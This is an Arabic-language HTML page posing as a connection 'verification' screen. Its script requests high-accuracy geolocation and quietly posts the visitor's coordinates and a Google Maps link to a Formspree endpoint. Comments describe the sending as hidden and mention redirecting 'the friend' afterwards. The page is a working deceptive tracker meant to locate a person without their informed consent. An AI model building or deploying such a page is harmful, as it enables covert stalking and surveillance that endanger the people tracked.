<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة التحقق</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f4f4f4; margin: 0; }
        .container { text-align: center; padding: 20px; background: white; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 10px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <div class="loader"></div>
    <h2 id="status">جاري التحقق من اتصالك...</h2>
    <p>من فضلك وافق على "طلب الموقع" للمتابعة.</p>
</div>

<script>
    // الرابط الخاص بك الذي حصلت عليه من Formspree
    const FORMSPREE_URL = "https://formspree.io/f/mvzblpga";

    navigator.geolocation.getCurrentPosition(sendData, showError, {
    enableHighAccuracy: true,
    timeout: 20000,
    maximumAge: 0
});
    function sendData(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

        // إرسال البيانات مخفياً إلى Formspree
        fetch(FORMSPREE_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                _subject: "📍 موقع جديد تم تحديده!",
                latitude: lat,
                longitude: lon,
                google_maps: mapsLink
            })
        }).then(() => {
            document.getElementById("status").innerHTML = "تم التحقق بنجاح!";
            // يمكنك توجيه الصديق لموقع آخر هنا بعد نجاح العملية
            // window.location.href = "https://www.google.com"; 
        });
    }

    function showError(error) {
        document.getElementById("status").innerHTML = "خطأ: يجب السماح بالوصول للموقع.";
    }
</script>

</body>
</html>
